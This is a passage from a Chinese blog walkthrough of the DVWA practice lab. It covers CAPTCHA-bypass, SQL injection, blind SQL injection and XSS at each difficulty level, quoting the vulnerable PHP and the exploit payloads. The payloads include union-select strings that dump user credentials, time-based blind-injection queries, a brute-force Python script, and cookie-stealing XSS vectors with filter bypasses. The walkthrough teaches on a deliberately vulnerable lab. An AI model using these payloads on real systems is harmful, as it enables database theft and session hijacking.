?&gt;</code></pre><p>Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码<br>&amp;passed_captcha=true</p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#39;recaptcha_response_field&#39; ] != &#39;hidd3n_valu3&#39; || $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] != &#39;reCAPTCHA&#39; ) ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>更改参数recaptcha_response_field以及http包头的User-Agent：等于reCAPTCHA</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241515_889.png" alt=""></p><p>impossible：<br>该级别代码未发现漏洞</p><h3 id="八：SQL-Injection（SQL注入）"><a href="#八：SQL-Injection（SQL注入）" class="headerlink" title="八：SQL Injection（SQL注入）"></a>八：SQL Injection（SQL注入）</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><p>手工注入（非盲注）的步骤。</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.下载数据</code></pre><p>Low：</p><pre><code>&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last  = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i++; } mysql_close(); } ?&gt;</code></pre><p>1.<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241530_443.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241533_295.png" alt=""><br>2.猜解SQL查询语句中的字段数<br>union select 1,2,3<br>3.确定显示的字段顺序<br>1′ union select 1,2 #<br>4.获取当前数据库</p><p>输入1′ union select 1,database() #，<br>5.获取数据库中的表</p><p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，<br>6.获取表中的字段名</p><p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #<br>7.下载数据</p><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>的数据<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241607_214.png" alt=""></p><p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><h5 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h5><p>&lt;?php </p><p>if( isset( $_POST[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_POST[ ‘id’ ];<br>    $id = mysql_real_escape_string( $id ); </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Display values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } //mysql_close(); </code></pre><p>} </p><p>?&gt;</p><p>区别代码：</p><blockquote><p>$id = mysql_real_escape_string( $id );</p></blockquote><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入<br>依然可以通过抓包改参数，提交恶意构造的查询参数。<br>1.判断是否存在注入，注入是字符型还是数字型<br>1.id为1 or 1=1 #<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241617_591.png" alt=""><br>查询成功<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241618_406.png" alt=""><br>2.猜解SQL查询语句中的字段数</p><p>抓包更改参数id为1 order by 2 #，查询成功：<br>抓包更改参数id为1 order by 3 #，报错：说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p><p>3.确定显示的字段顺序</p><p>抓包更改参数id为1 union select 1,2 #，查询成功：<br>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p><p>4.获取当前数据库</p><p>抓包更改参数id为1 union select 1,database() #，查询成功：<br>说明当前的数据库为dvwa。</p><p>5.获取数据库中的表</p><p>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p><p>说明数据库dvwa中一共有两个表，guestbook与users。</p><p>6.获取表中的字段名</p><p>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p><p>这是因为单引号被转义了，变成了\’。</p><p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><p>7.得到数据</p><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241642_694.png" alt=""><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>High：</p><p>&lt;?php </p><p>if( isset( $_SESSION [ ‘id’ ] ) ) {<br>    // Get input<br>    $id = $_SESSION[ ‘id’ ]; </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Get values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><blockquote><p>$query  = “SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;”; </p></blockquote><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。<br>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>Impossible：<br>Impossible级别的代码采用了PDO技术，暂时不会</p><p><a href="http://blog.chinaunix.net/uid-11582448-id-4432211.html" target="_blank" rel="external">SQLmap注入方法注入dvwa</a></p><h3 id="九：SQL-Injection-Blind"><a href="#九：SQL-Injection-Blind" class="headerlink" title="九：SQL Injection(Blind)"></a>九：SQL Injection(Blind)</h3><p>手工盲注的步骤（可与之前的手工注入作比较）：</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解当前数据库名3.猜解数据库中的表名4.猜解表中的字段名5.猜解数据</code></pre><p>Low：</p><p>&lt;?php </p><p>if( isset( $_GET[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_GET[ ‘id’ ]; </p><pre><code>// Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) {     // Feedback for end user     echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else {     // User wasn&#39;t found, so the page wasn&#39;t!     header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );     // Feedback for end user     echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); </code></pre><p>} </p><p>?&gt; </p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><p>基于布尔的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：<br>输入1’ and 1=1 #，显示存在：<br>输入1’ and 1=2 #，显示不存在：<br>说明存在字符型的SQL盲注。<br>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><pre><code>输入1’ and length(database())=1 #，显示不存在；输入1’ and length(database())=2 #，显示不存在；输入1’ and length(database())=3 #，显示不存在；输入1’ and length(database())=4 #，显示存在：</code></pre><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><pre><code>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。…</code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</code></pre><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在…1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</code></pre><p>说明第一个表名长度为9。</p><pre><code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。<br>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：<br>1.判断是否存在注入，注入是字符型还是数字型</p><pre><code>输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟；</code></pre><p>说明存在字符型的基于时间的盲注。<br>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><pre><code>1’ and if(length(database())=1,sleep(5),1) # 没有延迟1’ and if(length(database())=2,sleep(5),1) # 没有延迟1’ and if(length(database())=3,sleep(5),1) # 没有延迟1’ and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre><code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟说明数据库名的第一个字符为小写字母d。…</code></pre><p>重复上述步骤，即可猜解出数据库名。<br>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><pre><code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</code></pre><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><pre><code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</code></pre><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。<br>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><pre><code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟…1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</code></pre><p>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><pre><code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</code></pre><p>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。<br>5.猜解数据</p><p>同样采用二分法。太浪费时间了。推荐写python脚本</p><pre><code># -*-coding:utf-8-*-  import requests  import timepayloads = &#39;abcdefghijklmnopqrstuvwxyz0123456789@_.{}-&#39;flag = &#39;&#39;url = &quot;http://222.18.158.243:4609/index.php&quot;print(&#39;test1&#39;)for x in range(1,7):for char in payloads:starttime = time.time()payload = {&quot;id&quot;: &quot;1 and if(substring(database(), &quot;+str(x)+&quot;, 1)=&#39;&quot;+char+&quot;&#39;,sleep(6),1)#&quot;}rev = requests.get(url, cookies=cookies, params=payload)if time.time() - starttime &gt; 6:flag += charprint(&#39;DatabaseName = &#39;+flag)</code></pre><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $id = $_POST[ &#39;id&#39; ]; $id = mysql_real_escape_string( $id ); // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } //mysql_close(); } ?&gt; </code></pre><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>基于布尔的盲注：</p><pre><code>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>基于时间的盲注：</p><pre><code>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_COOKIE[ &#39;id&#39; ] ) ) { // Get input $id = $_COOKIE[ &#39;id&#39; ]; // Check database $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysql_query( $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } mysql_close(); } ?&gt;</code></pre><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。<br>漏洞利用</p><p>虽然添加了LIMIT 1，但是可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，基于布尔的盲注：</p><pre><code>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</code></pre><p>Impossible</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $id = $_GET[ &#39;id&#39; ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;; } else { // User wasn&#39;t found, so the page wasn&#39;t! header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); // Feedback for end user echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;; } } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。 基本无法注入。</p><h3 id="十-反射型XSS"><a href="#十-反射型XSS" class="headerlink" title="十:反射型XSS"></a>十:反射型XSS</h3><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>推荐xss cheat sheet<br><a href="http://www.52bug.cn/?post=211" target="_blank" rel="external">xss漏洞检测指南</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241842_78.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241843_306.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241844_339.png" alt=""></p><p>Low：</p><pre><code>&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt;</code></pre><p>无验证，直接注入</p><script>alert(document.cookie)</script>爆出cookie内容![](https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241848_956.png)Medium：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = str_replace( '<script>', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}</pre>";     }     ?>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。双写绕过输入<sc<script>ript>alert(/xss/)</script>，成功弹框：![](https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241856_385.png)大小写混淆绕过输入<script>alert(/xss/)</script>，成功弹框High：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Get input     $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     ?>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。绕过思路：标签很多，换一种标签即可。这里用img<img src="/archis/18acffef/1" onerror="alert(document.cookie)">![](https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241900_85.png)Impossible：    <?php     // Is there any input?     if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // Get input     $name = htmlspecialchars( $_GET[ 'name' ] );     // Feedback for end user     echo "<pre>Hello ${name}";     }     // Generate Anti-CSRF token     generateSessionToken();     ?>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。无法注入。### 十一：存储型XSSLow：    <?php     if( isset( $_POST[ 'btnSign' ] ) ) {     // Get input     $message = trim( $_POST[ 'mtxMessage' ] );     $name= trim( $_POST[ 'txtName' ] );     // Sanitize message input     $message = stripslashes( $message );     $message = mysql_real_escape_string( $message );     // Sanitize name input     $name = mysql_real_escape_string( $name );     // Update database     $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '' );     //mysql_close();     }     ?>stripslashes(string)函数删除字符串中的反斜杠。可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<script>alert(/xss/)</script> name一栏前端有字数限制，burp抓包改为<script>alert(/name/)</script><p>Medium</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>查看源码发现Name只过滤了<scrpit>标签<br>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。<br>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>burp抓包改name参数为<sc<script>ript&gt;alert(/xss/):<br>2.大小写混淆绕过<br>抓包改name参数为<script>alert(/xss/)</script>:<br>High</sc<script></b></scrpit></p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name ); $name = mysql_real_escape_string( $name ); // Update database $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt;</code></pre><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );<br>绕过思路：HTML页面修改Name的最大输入长度，注入Name，注入换一种标签，这里用img<br><img src="/archis/18acffef/1" onerror="alert(document.cookie)"></p><p>Impossible</p><pre><code>&lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name= trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>使用htmlspecialchars函数，解决了XSS</p></、>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dvwa </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/archis/undefined/"/>
      <url>/archis/undefined/</url>
      
